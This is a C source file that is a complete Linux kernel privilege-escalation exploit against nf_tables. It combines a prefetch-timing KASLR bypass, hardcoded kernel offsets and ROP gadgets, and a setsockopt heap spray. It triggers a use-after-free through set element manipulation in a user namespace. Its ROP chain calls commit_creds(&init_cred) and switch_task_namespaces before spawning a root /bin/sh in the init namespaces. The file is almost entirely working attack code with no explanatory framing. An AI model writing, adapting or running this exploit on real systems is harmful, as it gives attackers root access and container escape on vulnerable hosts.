#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sched.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <err.h>
#include <errno.h>
#include <net/if.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <linux/netfilter/nf_tables.h>
#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/set.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>
#include <linux/netfilter_ipv4/ip_tables.h>

#include "netlink_utils.h"

uint64_t find_task_by_vpid_off = 0x1bbe60;
uint64_t switch_task_namespaces_off = 0x1c3a30;
uint64_t commit_creds_off = 0x1c55a0;
uint64_t init_nsproxy_off = 0x2876720;
uint64_t init_cred_off = 0x2876960;
uint64_t swapgs_restore_regs_and_return_to_usermode_off = 0x1201146;

// 0xffffffff81f89a31 : push rbx ; and byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; jmp 0xffffffff82404c80
// 0xffffffff810e89fe : pop rdi ; jmp 0xffffffff82404c80
// 0xffffffff810e8a70 : pop rsi ; jmp 0xffffffff82404c80
// 0xffffffff8219394b : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; jmp 0xffffffff82404c80
// 0xffffffff81038160 : add rax, rsi ; jmp 0xffffffff82404c80
// 0xffffffff821581f6 : pop rcx ; jmp 0xffffffff82404c80
// 0xffffffff8172718b : mov qword ptr [rax], rcx ; jmp 0xffffffff82404c80

uint64_t push_rbx_pop_rsp = 0xf89a31;
uint64_t pop_rdi_ret = 0x0e89fe;
uint64_t pop_rsi_ret = 0x0e8a70;
uint64_t mov_rdi_rax_ret = 0x119394b;
uint64_t add_rax_rsi_ret = 0x038160;
uint64_t pop_rcx_ret = 0x11581f6;
uint64_t mov_rax_rcx_ret = 0x72718b;

uint64_t kbase = 0;

struct mnl_socket * nl;

#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

typedef unsigned long long u64;
typedef long long i64;

// KASLR bypass
//
// This code is adapted from https://github.com/IAIK/prefetch/blob/master/cacheutils.h
//
inline __attribute__((always_inline)) uint64_t rdtsc_begin() {
  uint64_t a, d;
  asm volatile ("mfence\n\t"
    "RDTSCP\n\t"
    "mov %%rdx, %0\n\t"
    "mov %%rax, %1\n\t"
    "xor %%rax, %%rax\n\t"
    "lfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d<<32) | a;
  return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end() {
  uint64_t a, d;
  asm volatile(
    "xor %%rax, %%rax\n\t"
    "lfence\n\t"
    "RDTSCP\n\t"
    "mov %%rdx, %0\n\t"
    "mov %%rax, %1\n\t"
    "mfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d<<32) | a;
  return a;
}


void prefetch(void* p)
{
  asm volatile (
    "prefetchnta (%0)\n"
    "prefetcht2 (%0)\n"
    : : "r" (p));
}

size_t flushandreload(void* addr) // row miss
{
  size_t time = rdtsc_begin();
  prefetch(addr);
  size_t delta = rdtsc_end() - time;
  return delta;
}

int64_t bypass_kaslr(u64 base) {
    if (!base) {
      #ifdef KASLR_BYPASS_INTEL
        #define OFFSET 0
        #define START (0xffffffff81000000ull + OFFSET)
        #define END   (0xffffffffD0000000ull + OFFSET)
        #define STEP   0x0000000001000000ull
        while (1) {
            u64 bases[7] = {0};
            for (int vote = 0; vote < ARRAY_LEN(bases); vote ++) {
                size_t times[(END - START) / STEP] = {};
                uint64_t addrs[(END - START) / STEP];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    times[ti] = ~0;
                    addrs[ti] = START + STEP * (u64)ti;
                }

                for (int i = 0; i < 16; i++) {
                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    u64 addr = addrs[ti];
                    size_t t = flushandreload((void*)addr);
                    if (t < times[ti]) {
                        times[ti] = t;
                    }
                }
                }

                size_t minv = ~0;
                size_t mini = -1;
                for (int ti = 0; ti < ARRAY_LEN(times) - 1; ti++) {
                    if (times[ti] < minv) {
                        mini = ti;
                        minv = times[ti];
                    }
                }

                if (mini < 0) {
                    return -1;
                }

                bases[vote] = addrs[mini];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
              if (c == 0) {
                base = bases[i];
              } else if (base == bases[i]) {
                c++;
              } else {
                c--;
              }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
              if (base == bases[i]) {
                c++;
              }
            }
            if (c > ARRAY_LEN(bases) / 2) {
              base -= OFFSET;
              goto got_base;
            }

            printf("majority vote failed:\n");
            printf("base = %llx with %d votes\n", base, c);
        }
      #else
        #define START (0xffffffff81000000ull)
        #define END (0xffffffffc0000000ull)
        #define STEP 0x0000000000200000ull
        #define NUM_TRIALS 7
        // largest contiguous mapped area at the beginning of _stext
        #define WINDOW_SIZE 11

        while (1) {
            u64 bases[NUM_TRIALS] = {0};

            for (int vote = 0; vote < ARRAY_LEN(bases); vote ++) {
                size_t times[(END - START) / STEP] = {};
                uint64_t addrs[(END - START) / STEP];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    times[ti] = ~0;
                    addrs[ti] = START + STEP * (u64)ti;
                }

                for (int i = 0; i < 16; i++) {
                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    u64 addr = addrs[ti];
                    size_t t = flushandreload((void*)addr);
                    if (t < times[ti]) {
                        times[ti] = t;
                    }
                }
                }

                uint64_t max = 0;
                int max_i = 0;
                for (int ti = 0; ti < ARRAY_LEN(times) - WINDOW_SIZE; ti++) {
                    uint64_t sum = 0;
                    for (int i = 0; i < WINDOW_SIZE; i++) {
                        sum += times[ti + i];
                    }
                    if (sum > max) {
                        max = sum;
                        max_i = ti;
                    }
                }

                bases[vote] = addrs[max_i];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
              if (c == 0) {
                base = bases[i];
              } else if (base == bases[i]) {
                c++;
              } else {
                c--;
              }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
              if (base == bases[i]) {
                c++;
              }
            }
            if (c > ARRAY_LEN(bases) / 2) {
              goto got_base;
            }

            printf("majority vote failed:\n");
            printf("base = %llx with %d votes\n", base, c);
        }
      #endif
    }

got_base:
    printf("using kernel base %llx\n", base);

    i64 off = base - 0xffffffff81000000;
    printf("kernel off: %lld\n", off);

    return off;

}

// CPU entry area pointers. We prepare some memory here that will be referenced
// by the ROP chains.
// We need:
//  - the struct nft_expr_ops { .eval } member
#define CPU_ENTRY_AREA_BASE(cpu) (0xfffffe0000001000ull + (uint64_t)cpu * 0x3b000)
#define PAYLOAD_LOCATION(cpu) (CPU_ENTRY_AREA_BASE(cpu) + 0x1f58 )
#define MAIN_CPU 0
#define HELPER_CPU 1

struct cpu_entry_area_payload {
  union {
    struct {
      // function to call to evaluate the expression
      uint64_t nft_expr_eval;
    };
    uint64_t regs[16];
  };
};
static void sig_handler(int s) {}

static __attribute__((noreturn)) void write_cpu_entry_area(void* payload) {
  asm volatile (
	  "mov %0, %%rsp\n"
	  "pop %%r15\n"
	  "pop %%r14\n"
	  "pop %%r13\n"
	  "pop %%r12\n"
	  "pop %%rbp\n"
	  "pop %%rbx\n"
	  "pop %%r11\n"
	  "pop %%r10\n"
	  "pop %%r9\n"
	  "pop %%r8\n"
	  "pop %%rax\n"
	  "pop %%rcx\n"
	  "pop %%rdx\n"
	  "pop %%rsi\n"
	  "pop %%rdi\n"
	  "divq (0x1234000)\n"
    "1:\n"
    "jmp 1b\n"
    : : "r"(payload)
  );
  __builtin_unreachable();
}

// Fill the CPU entry area exception stack of HELPER_CPU with a
// struct cpu_entry_area_payload
static void setup_cpu_entry_area() {
  if (fork()) {
    return;
  }

  struct cpu_entry_area_payload payload = {};
  payload.nft_expr_eval = kbase + push_rbx_pop_rsp;

    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(HELPER_CPU, &my_set);

    if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
        perror("[-] sched_setaffinity()");
        exit(EXIT_FAILURE);
    }

  signal(SIGFPE, sig_handler);
  signal(SIGTRAP, sig_handler);
  signal(SIGSEGV, sig_handler);
  setsid();

  write_cpu_entry_area(&payload);
}

static void* payload_page = NULL;

int spray_payload(int fd, void* payload) {
    struct ipt_replace replace = {};
    // into dyn-kmalloc-8k-cg please
    replace.size = 0x1000 + 1;
    // need this to make the allocation
    replace.num_counters = 1;

    memcpy(payload_page, &replace, sizeof(replace));
    memcpy(payload_page + sizeof(replace), payload, 0x200);

    // int fd = socket(AF_INET, SOCK_STREAM, 0);

    for (int i = 0; i < 8; i++) {
        // this faults during the copy_from_user_call, immediately frees our payload again,
        // but that is enough for us
        if (setsockopt(fd, SOL_IP, IPT_SO_SET_REPLACE, payload_page, 0x1000 * 2) == 0 || errno != EFAULT) {
        printf("spray payload: setsockopt(): unexpected error?\n");
        return -1;
        }
    }

    return 0;
}

void write_file(const char *filename, char *text) {
    int fd = open(filename, O_RDWR | O_CREAT, 0600);

    write(fd, text, strlen(text));
    close(fd);
}

void new_ns(void) {
    uid_t uid = getuid();
    gid_t gid = getgid();
    char buffer[0x100];

    unshare(CLONE_NEWUSER | CLONE_NEWNS);

    unshare(CLONE_NEWNET);

    write_file("/proc/self/setgroups", "deny");

    snprintf(buffer, sizeof(buffer), "0 %d 1", uid);
    write_file("/proc/self/uid_map", buffer);
    snprintf(buffer, sizeof(buffer), "0 %d 1", gid);
    write_file("/proc/self/gid_map", buffer);
}

/*
*	Add a network interface.
*	Equivalent to `ip link add ...`.
*/
int net_if(char *type, int n, int opt, bool change) {

    struct nlmsghdr *msg;
    struct nlattr *opts;
    struct ifinfomsg ifinfo = {};
    char name[0x100] = { 0 };
    int sk;

    strcpy(name, type);

    if (n >= 0)
        snprintf(name, sizeof(name), "%s-%d", type, n);

    // Initalize a netlink socket and allocate a nlmsghdr
    sk = nl_init_request(RTM_NEWLINK, &msg, NLM_F_REQUEST|NLM_F_CREATE);
    if (!sk) {
        perror("nl_init_request()");
        return -1;
    }

    ifinfo.ifi_family = AF_UNSPEC;
    ifinfo.ifi_type = PF_NETROM;
    ifinfo.ifi_index = 0;
    ifinfo.ifi_flags = opt;
    ifinfo.ifi_change = change ? 1 : 0;

    nlmsg_append(msg, &ifinfo, sizeof(ifinfo), NLMSG_ALIGNTO);

    nla_put_string(msg, IFLA_IFNAME, name);
    opts = nla_nest_start(msg, IFLA_LINKINFO);
    nla_put_string(msg, IFLA_INFO_KIND, type);
    nla_nest_end(msg, opts);

    // Send the netlink message and deallocate resources
    return nl_complete_request(sk, msg);
}

void pwn(){
    setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
    setns(open("/proc/1/ns/pid", O_RDONLY), 0);
    setns(open("/proc/1/ns/net", O_RDONLY), 0);

    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);

    exit(0);
}

uint64_t _user_rip = (uint64_t) pwn;
uint64_t _user_cs = 0;
uint64_t _user_rflags = 0;
uint64_t _user_sp = 0;
uint64_t _user_ss = 0;

void save_state(void) {
    __asm__(".intel_syntax noprefix;"
    "mov _user_cs, cs;"
    "mov _user_ss, ss;"
    "mov _user_sp, rsp;"
    "pushf;"
    "pop _user_rflags;"
    ".att_syntax");
    return;
}

#define TRIG_HOST "127.0.0.1"
#define TRIG_PORT 1337

/* Connect to a server in a specific port to trigger netfilter hooks */
void trig_net_sock(void) {
    int sockfd = 0;
    struct sockaddr_in servaddr, cli;

    bzero(&servaddr, sizeof(servaddr));
    bzero(&cli, sizeof(cli));

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if(sockfd == -1)
        printf("[-] Socket creation failed");

    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr(TRIG_HOST);
    servaddr.sin_port = htons(TRIG_PORT);

    if(connect(sockfd, (struct sockaddr*) &servaddr, sizeof(servaddr)) != 0)
        printf("[-] Connection with server failed");

    write(sockfd, "AAAA", 4);

    close(sockfd);

    return;
}

/* Set up a server to receive hook-triggering output packets */
void setup_trig_server(void) {
    int sfd = 0, sock = 0;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    char buffer[1024] = { 0 };

    if((sfd = socket(AF_INET, SOCK_STREAM, 0)) == 0)
        printf("[-] Error at socket()");

    if(setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)))
        printf("[-] Error at setsockopt()");

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(TRIG_PORT);

    if(bind(sfd, (struct sockaddr*)&address,  sizeof(address)) < 0)
        printf("[-] Error at bind()");

    if(listen(sfd, 3) < 0)
        printf("[-] Error at listen()");

    if((sock = accept(sfd, (struct sockaddr*)&address, (socklen_t*)&addrlen)) < 0)
        printf("[-] Error at accept()");

    read(sock, buffer, 4);

    close(sock);
    close(sfd);

    return;
}

void make_payload(uint64_t* data){
    int i = 0;

    // current = find_task_by_vpid(getpid())
    data[i++] = kbase + pop_rdi_ret;
    data[i++] = getpid();
    data[i++] = kbase + find_task_by_vpid_off;

    // current += offsetof(struct task_struct, rcu_read_lock_nesting)
    data[i++] = kbase + pop_rsi_ret;
    data[i++] = 0x474;
    data[i++] = kbase + add_rax_rsi_ret;

    data[i++] = kbase + pop_rsi_ret;
    data[i++] = 0;

    // current->rcu_read_lock_nesting = 0 (Bypass rcu protected section)
    data[i++] = kbase + pop_rcx_ret;
    data[i++] = 0;
    data[i++] = kbase + mov_rax_rcx_ret;

    // commit_creds(&init_cred)
    data[i++] = kbase + pop_rdi_ret;
    data[i++] = kbase + init_cred_off;
    data[i++] = kbase + commit_creds_off;

    // find_task_by_vpid(1)
    data[i++] = kbase + pop_rdi_ret;
    data[i++] = 1;
    data[i++] = kbase + find_task_by_vpid_off;

    // switch_task_namespaces(find_task_by_vpid(1), &init_nsproxy)
    data[i++] = kbase + mov_rdi_rax_ret;
    data[i++] = kbase + pop_rsi_ret;
    data[i++] = kbase + init_nsproxy_off;
    data[i++] = kbase + switch_task_namespaces_off;

    data[i++] = kbase + swapgs_restore_regs_and_return_to_usermode_off;
    data[i++] = 0;
    data[i++] = 0;
    data[i++] = _user_rip;
    data[i++] = _user_cs;
    data[i++] = _user_rflags;
    data[i++] = _user_sp;
    data[i++] = _user_ss;
}

void trig(){
    char * table1_name = "table1";
    char * set1_name = "set1";
    char * set2_name = "set2";
    char * chain1_name = "chain1";
    char * chain2_name = "chain2";

    struct nftnl_table * table = nftnl_table_alloc();
    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table1_name);
    nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);

    struct nftnl_chain * chain1 = nftnl_chain_alloc();
    nftnl_chain_set_str(chain1, NFTNL_CHAIN_TABLE, table1_name);
    nftnl_chain_set_str(chain1, NFTNL_CHAIN_NAME, chain1_name);
    nftnl_chain_set_u32(chain1, NFTNL_CHAIN_FLAGS, 0);
    nftnl_chain_set_str(chain1, NFTNL_CHAIN_TYPE, "filter");
    nftnl_chain_set_u32(chain1, NFTNL_CHAIN_HOOKNUM, NF_INET_LOCAL_OUT);
    nftnl_chain_set_u32(chain1, NFTNL_CHAIN_PRIO, 10);
    nftnl_chain_set_u32(chain1, NFTNL_CHAIN_POLICY, NF_ACCEPT);

    struct nftnl_chain * chain2 = nftnl_chain_alloc();
    nftnl_chain_set_str(chain2, NFTNL_CHAIN_TABLE, table1_name);
    nftnl_chain_set_str(chain2, NFTNL_CHAIN_NAME, chain2_name);
    nftnl_chain_set_u32(chain2, NFTNL_CHAIN_FLAGS, 0);

    struct nftnl_rule * rule_dangling = nftnl_rule_alloc();

    nftnl_rule_set_str(rule_dangling, NFTNL_RULE_TABLE, table1_name);
    nftnl_rule_set_str(rule_dangling, NFTNL_RULE_CHAIN, chain1_name);
    nftnl_rule_set_u32(rule_dangling, NFTNL_RULE_FAMILY, NFPROTO_IPV4);

    struct nftnl_expr * expr_immediate = nftnl_expr_alloc("immediate");
    nftnl_expr_set_u32(expr_immediate, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
    nftnl_expr_set_u32(expr_immediate, NFTNL_EXPR_IMM_VERDICT, NFT_GOTO);
    nftnl_expr_set_str(expr_immediate, NFTNL_EXPR_IMM_CHAIN, chain2_name);
    nftnl_rule_add_expr(rule_dangling, expr_immediate);

    struct nftnl_rule * rule_dummy = nftnl_rule_alloc();

    nftnl_rule_set_str(rule_dummy, NFTNL_RULE_TABLE, table1_name);
    nftnl_rule_set_str(rule_dummy, NFTNL_RULE_CHAIN, chain2_name);
    nftnl_rule_set_u32(rule_dummy, NFTNL_RULE_FAMILY, NFPROTO_IPV4);

    #define desc_count 2

    uint8_t desc_concat[desc_count];
    desc_concat[0] = 1;
    desc_concat[1] = 1;

    uint32_t n_elements = 0x100;

    #define key_size 8

    struct nftnl_set * set_trigger =  nftnl_set_alloc();

    nftnl_set_set_str(set_trigger, NFTNL_SET_TABLE, table1_name);
    nftnl_set_set_str(set_trigger, NFTNL_SET_NAME, set1_name);
    nftnl_set_set_u32(set_trigger, NFTNL_SET_FLAGS, NFT_SET_INTERVAL | NFT_SET_CONCAT | NFT_SET_TIMEOUT);
    nftnl_set_set_u32(set_trigger, NFTNL_SET_KEY_LEN, key_size);
    nftnl_set_set_u32(set_trigger, NFTNL_SET_ID, 1337);
    nftnl_set_set_u32(set_trigger, NFTNL_SET_DESC_SIZE, n_elements);
    nftnl_set_set_data(set_trigger, NFTNL_SET_DESC_CONCAT, desc_concat, desc_count);

    struct nftnl_set * set_elem_trigger =  nftnl_set_alloc();

    nftnl_set_set_str(set_elem_trigger, NFTNL_SET_TABLE, table1_name);
    nftnl_set_set_str(set_elem_trigger, NFTNL_SET_NAME, set1_name);

    // #define data_size 192

    unsigned long key_data[key_size] = {0,};
    unsigned long user_data[0x100] = {0,};

    struct nftnl_set_elem * elem = nftnl_set_elem_alloc();

    nftnl_set_elem_set(elem, NFTNL_SET_ELEM_KEY, &key_data, key_size);
    nftnl_set_elem_set(elem, NFTNL_SET_ELEM_USERDATA, &user_data, 8);
    nftnl_set_elem_set_u64(elem, NFTNL_SET_ELEM_TIMEOUT, 1);

    nftnl_set_elem_add(set_elem_trigger, elem);

    struct nftnl_set * set_trigger_verdict =  nftnl_set_alloc();

    nftnl_set_set_str(set_trigger_verdict, NFTNL_SET_TABLE, table1_name);
    nftnl_set_set_str(set_trigger_verdict, NFTNL_SET_NAME, set2_name);
    nftnl_set_set_u32(set_trigger_verdict, NFTNL_SET_FLAGS, NFT_SET_MAP | NFT_SET_INTERVAL | NFT_SET_CONCAT);
    nftnl_set_set_u32(set_trigger_verdict, NFTNL_SET_KEY_LEN, key_size);
    nftnl_set_set_u32(set_trigger_verdict, NFTNL_SET_ID, 1337);
    nftnl_set_set_u32(set_trigger_verdict, NFTNL_SET_DESC_SIZE, n_elements);
    nftnl_set_set_u32(set_trigger_verdict, NFTNL_SET_DATA_TYPE, NFT_DATA_VERDICT);
    nftnl_set_set_data(set_trigger_verdict, NFTNL_SET_DESC_CONCAT, desc_concat, desc_count);

    struct nftnl_set * set_elem_verdict[n_elements];

    for(int i = 0 ; i < n_elements/2; i++) {
        struct nftnl_set * set_elem =  nftnl_set_alloc();

        nftnl_set_set_str(set_elem, NFTNL_SET_TABLE, table1_name);
        nftnl_set_set_str(set_elem, NFTNL_SET_NAME, set2_name);

        struct nftnl_set_elem * elem2 = nftnl_set_elem_alloc();

        key_data[0] = i;

        nftnl_set_elem_set(elem2, NFTNL_SET_ELEM_KEY, &key_data, key_size);
        nftnl_set_elem_set_u32(elem2, NFTNL_SET_ELEM_VERDICT, NFT_BREAK);
        nftnl_set_elem_set(elem2, NFTNL_SET_ELEM_USERDATA, &user_data, 0x10);

        nftnl_set_elem_add(set_elem, elem2);

        set_elem_verdict[i] = set_elem;
    }

    for(int i = n_elements/2 ; i < n_elements; i++) {
        struct nftnl_set * set_elem =  nftnl_set_alloc();

        nftnl_set_set_str(set_elem, NFTNL_SET_TABLE, table1_name);
        nftnl_set_set_str(set_elem, NFTNL_SET_NAME, set2_name);

        struct nftnl_set_elem * elem2 = nftnl_set_elem_alloc();

        key_data[0] = i;

        nftnl_set_elem_set(elem2, NFTNL_SET_ELEM_KEY, &key_data, key_size);
        nftnl_set_elem_set_u32(elem2, NFTNL_SET_ELEM_VERDICT, NFT_GOTO);
        nftnl_set_elem_set_str(elem2, NFTNL_SET_ELEM_CHAIN, chain2_name);

        nftnl_set_elem_add(set_elem, elem2);

        set_elem_verdict[i] = set_elem;
    }

    size_t buf_size = MNL_SOCKET_BUFFER_SIZE * 100;
    char *buf = malloc(buf_size);

    struct mnl_nlmsg_batch * batch;
    int seq = 0;
    struct nlmsghdr * nlh;

    // setup table, chain, rule
    batch = mnl_nlmsg_batch_start(buf, buf_size);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, NFPROTO_IPV4, NLM_F_CREATE, seq++);
    nftnl_table_nlmsg_build_payload(nlh, table);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWCHAIN, NFPROTO_IPV4, NLM_F_CREATE, seq++);
    nftnl_chain_nlmsg_build_payload(nlh, chain1);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWCHAIN, NFPROTO_IPV4, NLM_F_CREATE, seq++);
    nftnl_chain_nlmsg_build_payload(nlh, chain2);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, NFPROTO_IPV4, NLM_F_CREATE, seq++);
    nftnl_rule_nlmsg_build_payload(nlh, rule_dangling);
    mnl_nlmsg_batch_next(batch);

    for(int i = 0 ; i < 0x200; i++){
        nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, NFPROTO_IPV4, NLM_F_CREATE, seq++);
        nftnl_rule_nlmsg_build_payload(nlh, rule_dummy);
        mnl_nlmsg_batch_next(batch);
    }

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }

    // setup set
    batch = mnl_nlmsg_batch_start(buf, buf_size);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWSET, NFPROTO_IPV4, NLM_F_CREATE, seq++);
    nftnl_set_nlmsg_build_payload(nlh, set_trigger);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWSET, NFPROTO_IPV4, NLM_F_CREATE, seq++);
    nftnl_set_nlmsg_build_payload(nlh, set_trigger_verdict);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }

    // trigger vuln
    batch = mnl_nlmsg_batch_start(buf, buf_size);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    for(int i = 0; i < n_elements; i++){
        nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWSETELEM, NFPROTO_IPV4, NLM_F_CREATE, seq++);
        nftnl_set_elems_nlmsg_build_payload(nlh, set_elem_trigger);
        mnl_nlmsg_batch_next(batch);
    }

    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELSETELEM, NFPROTO_IPV4, 0, seq++);
    nftnl_set_elems_nlmsg_build_payload(nlh, set_elem_trigger);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }

    // wait for destroy work
    usleep(300*1000);

    // spray set elems
    batch = mnl_nlmsg_batch_start(buf, buf_size);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    for(int i = 0; i < n_elements/2; i++){
        nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWSETELEM, NFPROTO_IPV4, NLM_F_CREATE, seq++);
        nftnl_set_elems_nlmsg_build_payload(nlh, set_elem_verdict[i]);
        mnl_nlmsg_batch_next(batch);
    }

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }

    // del set
    batch = mnl_nlmsg_batch_start(buf, buf_size);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELSET, NFPROTO_IPV4, 0, seq++);
    nftnl_set_nlmsg_build_payload(nlh, set_trigger);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }

    // wait for destroy work
    usleep(300*1000);

    // spray set elems
    batch = mnl_nlmsg_batch_start(buf, buf_size);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    for(int i = n_elements/2; i < n_elements; i++){
        nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWSETELEM, NFPROTO_IPV4, NLM_F_CREATE, seq++);
        nftnl_set_elems_nlmsg_build_payload(nlh, set_elem_verdict[i]);
        mnl_nlmsg_batch_next(batch);
    }

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }

    // del set
    batch = mnl_nlmsg_batch_start(buf, buf_size);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELSET, NFPROTO_IPV4, 0, seq++);
    nftnl_set_nlmsg_build_payload(nlh, set_trigger_verdict);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }

    // wait for destroy work
    usleep(300*1000);

    // del chain
    batch = mnl_nlmsg_batch_start(buf, buf_size);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELCHAIN, NFPROTO_IPV4, 0, seq++);
    nftnl_chain_nlmsg_build_payload(nlh, chain2);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }

    // wait for destroy work
    usleep(300*1000);

    char data[0x200] = {0,};

    // blob.size > 0
    *(uint64_t*)&data[0x0] = 0x100;
    // blob->rule->ops
    *(uint64_t*)&data[0x8] = PAYLOAD_LOCATION(1);
    make_payload((uint64_t*)(data+0x10));

    int spray_fd;

    spray_fd = socket(AF_INET, SOCK_STREAM, 0);
    // mmap an isolated page which will fault when over-read
    payload_page = mmap((void*)0xAAAAA000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);

    spray_payload(spray_fd, data);
}

void netfilter(){
    save_state();

    while(1){
        new_ns();
        net_if("lo", -1, IFF_UP, true);

        nl = mnl_socket_open(NETLINK_NETFILTER);
        if (nl == NULL) {
            err(1, "mnl_socket_open");
        }

        trig();

        int sfd = 0;

        /* Set up server at TRIG_PORT in a new process */
        sfd = fork();
        if(sfd == 0) {
            setup_trig_server();
            exit(0);
        }

        // wait for trig server
        usleep(100*1000);

        /* Trigger the network hook */
        trig_net_sock();
    }

    mnl_socket_close(nl);
}

